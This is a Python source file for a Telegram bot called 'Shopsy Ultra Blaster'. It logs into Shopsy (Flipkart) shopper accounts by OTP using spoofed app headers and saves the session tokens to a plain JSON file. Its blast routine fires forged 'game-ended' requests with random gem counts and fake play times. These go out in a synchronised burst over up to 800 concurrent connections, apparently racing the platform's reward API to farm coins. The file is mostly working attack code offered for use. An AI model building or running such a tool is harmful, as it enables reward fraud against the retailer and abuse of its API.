import os
import json
import time
import uuid
import random
import asyncio
import aiohttp
import requests
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters

# Environment Variables
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
SESSION_FILE = "shopsy_sessions.json"
GAMES_LIST = ["ludo", "match-3", "city-builder", "goods-triple", "runner-3d", "nazaria"]

app = Flask(__name__)
telegram_app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

# Temporary memory to manage user states (OTP flow)
USER_STATES = {}

# Helper Functions
def load_sessions():
    if os.path.exists(SESSION_FILE):
        with open(SESSION_FILE, "r") as f:
            try: return json.load(f)
            except: return {}
    return {}

def save_session(mobile, account_id, tokens):
    sessions = load_sessions()
    sessions[mobile] = {"account_id": account_id, "tokens": tokens}
    with open(SESSION_FILE, "w") as f:
        json.dump(sessions, f, indent=4)

async def prepare_and_wait(session, games_url, game_id, account_id, headers, fire_trigger):
    start_payload = {"requestMethod": "POST", "routeUri": "game/game-started", "payload": {"userId": account_id, "gameId": game_id}}
    try:
        async with session.post(games_url, headers=headers, json=start_payload) as start_req:
            if start_req.status != 200: return 0
            start_res = await start_req.json()
            if not start_res.get("success"): return 0
            game_session_id = start_res["data"]["sessionId"]

        gems_count = random.randint(1000, 5000)
        play_time = random.randint(80, 99)
        end_payload = {
            "requestMethod": "POST", "routeUri": "game/game-ended",
            "payload": {"userId": account_id, "gameId": game_id, "sessionId": game_session_id, "gemsEarned": gems_count, "playTimeInSec": play_time}
        }
        await fire_trigger.wait()
        async with session.post(games_url, headers=headers, json=end_payload) as end_req:
            if end_req.status == 200:
                end_res = await end_req.json()
                if end_res.get("success"):
                    return end_res.get("data", {}).get("coinsEarnedForGame", 0)
    except Exception: pass
    return 0

async def execute_async_blast(games_url, account_id, headers, queued_tasks, max_threads=800):
    fire_trigger = asyncio.Event()
    connector = aiohttp.TCPConnector(limit=max_threads)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for game_id in queued_tasks:
            task = asyncio.create_task(prepare_and_wait(session, games_url, game_id, account_id, headers, fire_trigger))
            tasks.append(task)
        await asyncio.sleep(2)
        fire_trigger.set()
        results = await asyncio.gather(*tasks)
        return sum(filter(None, results))

# --- PREMIUM UI TELEGRAM HANDLERS ---

async def start_command(update: Update, context):
    keyboard = [
        [InlineKeyboardButton("📱 Saved Accounts", callback_data="view_accounts"),
         InlineKeyboardButton("🚀 Quick Blast", callback_data="quick_blast")],
        [InlineKeyboardButton("⚡ Help & Commands", callback_data="view_help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    msg = (
        "✨ *WELCOME TO SHOPSY ULTRA BLASTER* ✨\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 *High-Speed Automated Claim Engine*\n\n"
        "📌 *Quick Command Syntax:*\n"
        "├ 🔐 `/login <mobile>` — Request Login OTP\n"
        "├ 🔑 `/otp <code>` — Verify & Save Account\n"
        "├ 💥 `/blast <mobile>` — Trigger High-Speed Claim\n"
        "└ 📑 `/accounts` — View Saved Sessions\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "👇 *Select an action below to get started:*"
    )
    if update.message:
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=reply_markup)
    elif update.callback_query:
        await update.callback_query.edit_message_text(msg, parse_mode="Markdown", reply_markup=reply_markup)

async def callback_handler(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    if query.data == "view_accounts":
        await accounts_command(update, context)
    elif query.data == "quick_blast":
        await query.message.reply_text(
            "⚡ *Quick Blast Trigger*\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "Please send the command in this format:\n"
            "`/blast <mobile_number>`",
            parse_mode="Markdown"
        )
    elif query.data == "view_help":
        keyboard = [[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]]
        help_msg = (
            "🛠 *COMMAND USAGE GUIDE*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "1️⃣ *Login Account:*\n"
            "   Command: `/login 9876543210`\n"
            "   _Requests OTP for your Shopsy number._\n\n"
            "2️⃣ *Submit OTP:*\n"
            "   Command: `/otp 123456`\n"
            "   _Verifies OTP & securely saves credentials._\n\n"
            "3️⃣ *Run Blaster:*\n"
            "   Command: `/blast 9876543210`\n"
            "   _Launches high-concurrency games claim._\n"
        )
        await query.edit_message_text(help_msg, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
    elif query.data == "main_menu":
        await start_command(update, context)

async def login_command(update: Update, context):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text(
            "⚠️ *Invalid Usage!*\n"
            "Format: `/login <10-digit-mobile>`\n"
            "Example: `/login 9876543210`",
            parse_mode="Markdown"
        )
        return

    mobile_number = context.args[0].strip()
    device_id = uuid.uuid4().hex
    page_fetch_url = "https://1.rome.api.flipkart.net/4/page/fetch"
    auth_url = "https://1.rome.api.flipkart.net/1/action/view"
    
    session = requests.Session()
    session.headers.update({
        "FK-TENANT-ID": "SHOPSY", "business": "reseller", "X-PARTNER-CONTEXT": '{"source":"reseller"}',
        "Content-Type": "application/json; charset=UTF-8", "User-Agent": "okhttp/4.9.2",
        "X-Layout-Version": '{"appVersion":"910000","frameworkVersion":"1.0"}',
        "X-User-Agent": f"Mozilla/5.0 (Linux; Android 16; CPH2585 Build/TP1A.220905.001) FKUA/Retail/2291175/Android/Mobile (OnePlus/CPH2585/{device_id})"
    })

    pre_flight_payload = {
        "pageUri": "https://www.shopsy.in/shopsy2-login-page-store?sourceContext=Account",
        "pageContext": {"paginatedFetch": False, "pageNumber": 1, "fetchAllPages": False, "fetchSeoData": False}
    }
    pre_res = session.post(page_fetch_url, json=pre_flight_payload)
    if pre_res.status_code == 200:
        sess_state_0 = pre_res.json().get("SESSION", {})
        if "at" in sess_state_0: session.headers["at"] = sess_state_0["at"]
        if "sn" in sess_state_0: session.headers["sn"] = sess_state_0["sn"]

    payload_1 = {
        "actionRequestContext": {
            "type": "LOGIN_IDENTITY_VERIFY_SHOPSY2", "loginId": mobile_number, "loginIdPrefix": "+91",
            "phoneNumberFormat": "E164", "addAppHash": True, "loginType": "MOBILE", "verificationType": "OTP",
            "sourceContext": "Account", "clientQueryParamMap": None
        }
    }

    response_1 = session.post(auth_url, json=payload_1)
    res_data_1 = response_1.json()
    action_context = res_data_1.get('RESPONSE', {}).get('actionResponseContext', {})

    if action_context.get('remainingAttempts') == 0:
        await update.message.reply_text("⛔ *Rate Limit Exceeded!* Please try again later.", parse_mode="Markdown")
        return

    req_id = action_context.get('requestId')
    sess_state_1 = res_data_1.get("SESSION", {})
    if "at" in sess_state_1: session.headers["at"] = sess_state_1["at"]
    if "sn" in sess_state_1: session.headers["sn"] = sess_state_1["sn"]

    USER_STATES[user_id] = {
        "mobile": mobile_number, "req_id": req_id,
        "headers": dict(session.headers), "device_id": device_id
    }
    await update.message.reply_text(
        "📲 *OTP DISPATCHED SUCCESSFUL*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Mobile: `{mobile_number}`\n\n"
        "👉 Enter OTP using: `/otp <your_code>`",
        parse_mode="Markdown"
    )

async def otp_command(update: Update, context):
    user_id = update.effective_user.id
    if user_id not in USER_STATES:
        await update.message.reply_text("❌ *Session Not Found!* Run `/login <mobile>` first.", parse_mode="Markdown")
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/otp 123456`", parse_mode="Markdown")
        return

    otp_code = context.args[0].strip()
    state = USER_STATES[user_id]
    auth_url = "https://1.rome.api.flipkart.net/1/action/view"

    session = requests.Session()
    session.headers.update(state["headers"])

    payload_2 = {
        "actionRequestContext": {
            "type": "LOGIN_SHOPSY2", "loginId": state["mobile"], "loginIdPrefix": "+91", "password": None,
            "otp": otp_code, "otpRequestId": state["req_id"], "remainingAttempts": 5, "phoneNumberFormat": "E164",
            "loginType": "MOBILE", "verificationType": "OTP", "sourceContext": "Account", "churned": False,
            "otpRegex": None, "data": None, "clientQueryParamMap": None
        }
    }

    response_2 = session.post(auth_url, json=payload_2)
    res_data_2 = response_2.json()
    session_data_2 = res_data_2.get("SESSION", {})
    account_id = session_data_2.get("accountId")
    access_token = session_data_2.get("at")

    if account_id and access_token:
        auth_tokens = {
            "at": access_token, "sn": session_data_2.get("sn", session.headers.get("sn")),
            "secureToken": session.headers.get("secureToken"), "vid": session.headers.get("X-Visit-Id")
        }
        save_session(state["mobile"], account_id, auth_tokens)
        del USER_STATES[user_id]
        
        keyboard = [[InlineKeyboardButton("🚀 Launch Blast Now", callback_data="quick_blast")]]
        await update.message.reply_text(
            "🎉 *AUTHENTICATION SUCCESSFUL*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Mobile: `{state['mobile']}`\n"
            "✅ Session saved successfully!",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text("❌ *Authentication Failed!* Invalid OTP code.", parse_mode="Markdown")

async def blast_command(update: Update, context):
    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/blast <mobile>`", parse_mode="Markdown")
        return

    mobile_number = context.args[0].strip()
    sessions = load_sessions()

    if mobile_number not in sessions:
        await update.message.reply_text("❌ *Account Unregistered!* Login first using `/login`.", parse_mode="Markdown")
        return

    status_msg = await update.message.reply_text(
        "🚀 *PREPARING CONCURRENCY ENGINE...*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📡 Bypassing WAF & Warming up CDN...\n"
        "⚡ Pre-loading 800+ Game Connections...",
        parse_mode="Markdown"
    )

    data = sessions[mobile_number]
    account_id = data["account_id"]
    games_url = "https://1.rome.api.flipkart.net/1/shopsy/games"

    device_id = uuid.uuid4().hex
    games_headers = {
        "x-user-agent": f"Mozilla/5.0 (Linux; Android 16; CPH2585 Build/TP1A.220905.001) FKUA/Retail/2291175/Android/Mobile (OnePlus/CPH2585/{device_id})",
        "sessionid": "session_id", "Content-Type": "application/json; charset=UTF-8", "User-Agent": "okhttp/4.9.2"
    }

    try:
        requests.post(games_url, headers=games_headers, json={"requestMethod":"GET","routeUri":"user/get-user","payload":{"userId":account_id,"userName":"User"}})
        requests.post(games_url, headers=games_headers, json={"requestMethod":"POST","routeUri":"gullak/claim-gullak","payload":{"userId":account_id}})
    except Exception: pass

    queued_tasks = list(GAMES_LIST)
    total_coins = await execute_async_blast(games_url, account_id, games_headers, queued_tasks, max_threads=800)

    try:
        final_res = requests.post(games_url, headers=games_headers, json={"requestMethod": "GET", "routeUri": "user/get-user", "payload": {"userId": account_id, "userName": "User"}}).json()
        final_balance = final_res.get("data", {}).get("earnings", {}).get("coinsEarnedTotal", 0)
    except Exception:
        final_balance = "N/A"

    result_text = (
        "💎 *SHOPSY BLAST COMPLETED* 💎\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 Account: `{mobile_number}`\n"
        f"🪙 Coins Claimed: `+{total_coins}`\n"
        f"💰 Total Balance: `{final_balance}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "✅ All async threads executed successfully!"
    )
    await status_msg.edit_text(result_text, parse_mode="Markdown")

async def accounts_command(update: Update, context):
    sessions = load_sessions()
    if not sessions:
        msg = "📂 *NO SAVED ACCOUNTS FOUND*\nUse `/login <mobile>` to add an account."
        if update.callback_query:
            await update.callback_query.edit_message_text(msg, parse_mode="Markdown")
        else:
            await update.message.reply_text(msg, parse_mode="Markdown")
        return

    acc_list = []
    for idx, mob in enumerate(sessions.keys(), 1):
        acc_list.append(f"`{idx}.` 📱 `{mob}`")

    accs = "\n".join(acc_list)
    msg = (
        "📑 *SAVED SHOPSY SESSIONS*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{accs}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "👉 Run `/blast <mobile>` to claim coins."
    )
    if update.callback_query:
        keyboard = [[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]]
        await update.callback_query.edit_message_text(msg, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_text(msg, parse_mode="Markdown")

# Register Handlers
telegram_app.add_handler(CommandHandler("start", start_command))
telegram_app.add_handler(CommandHandler("login", login_command))
telegram_app.add_handler(CommandHandler("otp", otp_command))
telegram_app.add_handler(CommandHandler("blast", blast_command))
telegram_app.add_handler(CommandHandler("accounts", accounts_command))
telegram_app.add_handler(CallbackQueryHandler(callback_handler))

async def process_telegram_update(update_json):
    async with telegram_app:
        update = Update.de_json(update_json, telegram_app.bot)
        await telegram_app.process_update(update)

@app.route("/webhook", methods=["POST"])
def webhook():
    if request.method == "POST":
        try:
            update_json = request.get_json(force=True)
            asyncio.run(process_telegram_update(update_json))
            return jsonify({"status": "ok"}), 200
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
    return jsonify({"status": "method not allowed"}), 405

@app.route("/")
def home():
    return "Shopsy Telegram Bot Server Running!", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
